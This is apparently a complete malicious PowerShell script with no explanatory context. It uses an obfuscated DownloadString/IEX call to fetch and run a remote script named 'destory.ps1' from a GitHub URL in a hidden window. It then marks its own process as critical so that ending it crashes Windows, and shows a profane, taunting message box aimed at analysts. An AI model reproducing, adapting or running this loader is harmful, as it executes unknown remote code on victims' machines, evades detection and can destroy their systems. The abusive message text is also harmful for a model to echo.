$code = @"
using System;
using System.Runtime.InteropServices;

public class CriticalProcess
{
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern uint RtlSetProcessIsCritical(bool bNewValue, bool bNeedScb, bool bCheckFlag);
}
"@
$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/destory.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
Add-Type -TypeDefinition $code
[CriticalProcess]::RtlSetProcessIsCritical($true, $false, $false)
[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") | Out-Null
[System.Windows.Forms.MessageBox]::Show("Analysis is gay!", " Fuck ", "OK", "Warning")
